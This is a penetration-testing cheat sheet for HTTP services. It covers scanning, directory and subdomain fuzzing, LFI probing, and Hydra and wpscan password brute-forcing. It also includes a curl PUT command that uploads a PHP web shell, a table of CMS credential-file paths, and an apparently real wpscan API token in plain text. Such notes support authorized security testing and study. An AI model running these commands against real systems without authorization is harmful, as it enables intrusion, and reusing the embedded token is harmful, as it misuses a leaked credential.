# HTTP

## General

### Manual

1. View page source

## Scans

<table><thead><tr><th width="374">Info</th><th>Command</th></tr></thead><tbody><tr><td>Nikto standard scan</td><td><code>nikto -host=http://$ip</code></td></tr><tr><td>Whatweb standard scan</td><td><code>whatweb --color=never --no-errors -a 3 -v http://$ip 2>&#x26;1</code></td></tr><tr><td>nmap web scan</td><td><code>nmap --reason -Pn -sV -p 80 --script="banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)" $ip</code></td></tr></tbody></table>

## Inspecting Pages

<table><thead><tr><th width="238">Info</th><th>Command</th></tr></thead><tbody><tr><td>Download webpages</td><td><code>mkdir web; cd web; wget -r -nd http://$ip; cd ../</code></td></tr><tr><td>Check for pass string</td><td><code>grep --color=auto -R 'pass' web/</code></td></tr><tr><td>Search for comments</td><td><code>grep --color=auto -R -F '&#x3C;!-' web/</code></td></tr><tr><td>Check robots.txt</td><td><code>curl http://$ip/robots.txt</code></td></tr><tr><td>Check robots.txt HTTPS</td><td><code>curl -k https://$ip/robots.txt</code></td></tr></tbody></table>

## Fuzz

<table><thead><tr><th width="160">Info</th><th>Command</th></tr></thead><tbody><tr><td>Find index extension</td><td><code>ffuf -u http://$ip/indexFUZZ -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt</code></td></tr><tr><td>File extension check</td><td><code>ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.txt</code></td></tr><tr><td>Directory check</td><td><code>ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></td></tr><tr><td>Directory check (hide 403)</td><td><code>ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fc 403</code></td></tr><tr><td>Directory check (show only 200)</td><td><code>ffuf -u http://$ip/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -mc 200</code></td></tr><tr><td>Fuzz Parameters</td><td><code>wfuzz --hh BBB -H "User-Agent:test" -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt http://10.10.10.69/sync/?FUZZ{not_this}=test</code></td></tr><tr><td>Fuzz parameters</td><td><code>ffuf -u 'http://$ip/sqli-labs/Less-1/?FUZZ=1' -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fw 39</code></td></tr><tr><td>Test parameters with integers</td><td>`for i in {0..255}; do echo $i; done</td></tr><tr><td>Post password bruteforce</td><td><code>ffuf -u http://$ip/sqli-labs/Less-11/ -c -w /usr/share/seclists/Passwords/Leaked-Databases/hak5.txt -X POST -d 'uname=Dummy&#x26;passwd=FUZZ&#x26;submit=Submit' -fs 1435 -H 'Content-Type: application/x-www-form-urlencoded'</code></td></tr><tr><td>Subdomain check</td><td><code>ffuf -u http://FUZZ.mydomain.com -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt</code></td></tr><tr><td>Use proxy</td><td><code>ffuf -u http://$ip/ -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -x http://127.0.0.1:8080</code></td></tr><tr><td>Use proxy (matches only)</td><td><code>ffuf -u http://$ip/ -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -replay-proxy http://127.0.0.1:8080</code></td></tr></tbody></table>

## Directory Search

<table><thead><tr><th width="123">Info</th><th>Command</th></tr></thead><tbody><tr><td>feroxbuster (good)</td><td><code>feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 60 --url http://$domain/ -x txt,php,html -C 403,301,302</code></td></tr><tr><td>feroxbuster (best)</td><td><code>feroxbuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 60 --url http://$domain/ -x txt,php,html -C 403,301,302</code></td></tr><tr><td>ffuf medium</td><td><code>ffuf -u http://$ip/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt</code></td></tr><tr><td>ffuf big</td><td><code>ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></td></tr><tr><td>gobuster (quick)</td><td><code>gobuster dir -u http://$ip/ -w /usr/share/wordlists/dirb/common.txt -t 50 -o gobuster.txt -e -k</code></td></tr><tr><td>gobuster (good)</td><td><code>gobuster dir -u http://$ip -e -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 80</code></td></tr><tr><td>gobuster (best)</td><td><code>gobuster dir -u http://$ip -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 80</code></td></tr><tr><td>dirbuster (good)</td><td><code>dirbuster -l /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 40 -u http://$ip</code></td></tr><tr><td>dirbuster (best)</td><td><code>dirbuster -l /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 40 -u http://$ip</code></td></tr><tr><td>wfuzz</td><td><code>wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt -w /usr/share/wfuzz/wordlist/general/extensions_common.txt -c --hc 404 http://$ip:8080/FUZZFUZ2Z</code></td></tr><tr><td>Using response size filter</td><td><code>wfuzz -w /usr/share/dirb/wordlists/big.txt --hh 2123 -c http://$ip:80/FUZZ</code></td></tr></tbody></table>

## Subdomain Check

<table><thead><tr><th width="171">Info</th><th>Command</th></tr></thead><tbody><tr><td>Check for subdomains</td><td><code>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.$domain" -u http://$domain/ -fs 85</code></td></tr><tr><td>Check for subdomains</td><td><code>gobuster vhost -u $domain -w /usr/share/dirb/wordlists/big.txt</code></td></tr><tr><td>Check for subdomains</td><td><code>gobuster vhost -u $domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt</code></td></tr><tr><td>Check for subdomains</td><td><code>wfuzz --hw 1922 -u http://$domain -H "Host: FUZZ.$domain" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt</code></td></tr><tr><td>wfuzz</td><td><code>wfuzz -c -f subdomains.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://$domain/" -H "Host: FUZZ.$domain" --hl 107</code></td></tr></tbody></table>

## LFI Check

<table><thead><tr><th width="154">Info</th><th>Command</th></tr></thead><tbody><tr><td>Find response size</td><td><code>wfuzz -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt -u http://$ip/thankyou.php?FUZZ=FUZ2Z</code></td></tr><tr><td>Add standard response size</td><td><code>wfuzz -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt -u http://$ip/thankyou.php?FUZZ=FUZ2Z --hh 851</code></td></tr></tbody></table>

## Bruteforce

<table><thead><tr><th width="166">Info</th><th>Command</th></tr></thead><tbody><tr><td>Hydra http-get login</td><td><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt -f $ip http-get /inferno/ -t 64 -V</code></td></tr><tr><td>Hydra http-post login</td><td><code>hydra -V -l $user -P /usr/share/wordlists/rockyou.txt $ip http-post-form "/login/login.php:username=^USER^&#x26;password=^PASS^&#x26;Login=Login:Login Failed"</code></td></tr><tr><td>Hydra http-post json</td><td><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt 'http-post://$ip/api/login/:{"username"\:"^USER^","password"\:"^PASS^"}:H=Content-Type\:application/json:F=ERROR'</code></td></tr></tbody></table>

## Curl

<table><thead><tr><th width="230">Info</th><th>Command</th></tr></thead><tbody><tr><td>Get header</td><td><code>curl -i $ip</code></td></tr><tr><td>Get all info</td><td><code>curl -i -L $ip</code></td></tr><tr><td>Check for title and links</td><td><code>curl $ip -s -L | grep "title|href" | sed -e 's/^[[:space:]]*//'</code></td></tr><tr><td>Look at page text only</td><td>`curl $ip -s -L | html2text -width '99' | uniq</td></tr><tr><td>Check if it is possible to upload</td><td><code>curl -v -X OPTIONS http://$ip/</code></td></tr><tr><td>Upload shell if possible</td><td><code>curl -v -X PUT -d '&#x3C;?php system($_GET["cmd"]); ?>' http://$ip/test/shell.php</code></td></tr></tbody></table>

## Applications

### CMS Configuration Files

| Software    | Location                                   |
| ----------- | ------------------------------------------ |
| WordPress   | `/var/www/html/wp-config.php`              |
| Joomla      | `/var/www/configuration.php`               |
| Dolphin CMS | `/var/www/html/inc/header.inc.php`         |
| Drupal      | `/var/www/html/sites/default/settings.php` |
| Mambo       | `/var/www/configuration.php`               |
| PHPNuke     | `/var/www/config.php`                      |
| PHPbb       | `/var/www/config.php`                      |

### Scan Utilities

<table><thead><tr><th width="142.33333333333331">Scan Type</th><th width="196" align="center">Description</th><th>Command</th></tr></thead><tbody><tr><td>Drupal</td><td align="center">Generic Drupal scan</td><td><code>droopescan scan drupal -u $ip:1898</code></td></tr><tr><td>Joomla</td><td align="center">joomscan</td><td><code>perl /opt/joomscan/joomscan.pl -u $ip</code></td></tr><tr><td>Joomla</td><td align="center">joomscan enumerate components</td><td><code>joomscan -u http://$ip --enumerate-components</code></td></tr><tr><td>Magento</td><td align="center">Magescan</td><td><code>php magescan.phar scan:all http://$ip</code></td></tr><tr><td>Typo3Scan</td><td align="center">Typo3Scan</td><td><code>python3 /opt/Typo3Scan/typo3scan.py -d http://$ip/ --vuln</code></td></tr><tr><td>Wordpress</td><td align="center">Check plugin folder manually</td><td><code>curl http://$ip/wp-content/plugins/</code></td></tr><tr><td>Wordpress</td><td align="center">Find Username Scan</td><td><code>wpscan --url http://$ip/wordpress --enumerate u</code></td></tr><tr><td>Wordpress</td><td align="center">Bruteforce Single User</td><td><code>wpscan --url http://$ip/wordpress -U $user -P /usr/share/wordlists/rockyou.txt</code></td></tr><tr><td>Wordpress</td><td align="center">Bruteforce Multiple Users</td><td><code>wpscan --url http://$ip/wordpress -U users.txt -P /usr/share/wordlists/rockyou.txt</code></td></tr><tr><td>Wordpress</td><td align="center">General Scan</td><td><code>wpscan --url http://$ip/ --enumerate ap,at,tt,cb,dbe,u,m --disable-tls-checks --api-token eKpnMWH29Yd1KDYgZdvUodzwaUPhCwqvs6oabDSlTpE --ignore-main-redirect</code></td></tr><tr><td>Wordpress</td><td align="center">Agressive Scan</td><td><code>wpscan --url http://$ip/ --enumerate ap --disable-tls-checks --api-token eKpnMWH29Yd1KDYgZdvUodzwaUPhCwqvs6oabDSlTpE --ignore-main-redirect --plugins-detection aggressive</code></td></tr></tbody></table>

### Version Info

<table><thead><tr><th width="239">Application</th><th>Location</th></tr></thead><tbody><tr><td>Drupal</td><td>Check for CHANGELOG.txt</td></tr><tr><td>Joomla</td><td>/administrator/manifests/files/joomla.xml</td></tr><tr><td>Strapi Version</td><td><code>curl http://$domain/admin/strapiVersion</code></td></tr></tbody></table>
